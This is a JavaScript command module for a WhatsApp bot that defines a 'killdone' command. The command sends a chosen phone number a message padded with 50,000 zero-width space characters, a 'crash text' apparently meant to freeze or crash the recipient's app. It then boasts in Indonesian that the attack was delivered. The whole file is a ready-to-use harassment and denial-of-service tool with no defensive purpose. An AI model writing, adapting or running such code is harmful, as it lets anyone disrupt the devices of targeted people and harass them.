module.exports = {
  name: 'killdone',
  execute: async (client, message, args) => {
    const target = args[0];
    if (!target) {
      return message.reply('👑 Format: .killdone [target]');
    }

    const killPayload = '\u200B'.repeat(50000) + '☠️👑 KILLDONE SUPREME ACTIVATED.';
    await client.sendMessage(target + '@s.whatsapp.net', { text: killPayload });

    return message.reply(`👑 Killdone Supreme berhasil dikirim ke ${target}.`);
  }
};
